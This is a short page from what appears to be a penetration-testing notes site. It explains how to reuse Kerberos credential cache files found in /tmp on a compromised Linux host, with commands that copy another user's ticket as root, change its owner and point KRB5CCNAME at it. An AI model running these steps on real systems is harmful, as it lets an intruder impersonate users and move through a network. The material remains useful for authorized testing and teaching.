# Credential Cache Files

## Credential Cache Files

* compromise a logged user and use his tickets
*   ccached files :

    &#x20;→ located in /tmp

![](<../../../../../.gitbook/assets/image (218).png>)

### **Copy the ticket**

{% hint style="warning" %}
**Tickets are only readable by his owner. Not an issue if the box is rooted.**
{% endhint %}

```csharp
sudo cp krb5cc_581000500_gC90OC krb5cc_581000500_testme
chown homer_potter."Domain Users" krb5cc_581000500_testme
```

### **Set the ENV variable**

```csharp
kdestroy
export KRB5CCNAME=/tmp/krb5cc_581000500_testme
```

![](<../../../../../.gitbook/assets/image (29).png>)
